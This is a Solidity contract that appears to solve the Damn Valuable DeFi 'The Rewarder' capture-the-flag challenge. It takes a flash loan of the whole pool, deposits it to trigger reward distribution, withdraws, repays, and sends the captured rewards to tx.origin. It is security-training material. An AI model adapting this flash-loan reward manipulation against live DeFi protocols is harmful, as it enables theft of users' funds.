// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttack {
    ITheRewarderPool public rwPool;
    IFlashLoanerPool public flPool;

    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor (ITheRewarderPool _rwPool , IFlashLoanerPool _flPool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
        rwPool = _rwPool;
        flPool = _flPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function attack() external {
        uint256 amount = liquidityToken.balanceOf(address(flPool));
        liquidityToken.approve(address(rwPool), amount);
        flPool.flashLoan(amount);

        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable{
        //Trigger distributeRewards()
        rwPool.deposit(amount);
    
        // Withdraw LP token back for paying back to flashloan
        rwPool.withdraw(amount);
        liquidityToken.transfer(address(flPool), amount);         // payback to flashloan
    }

    receive() external payable{}
}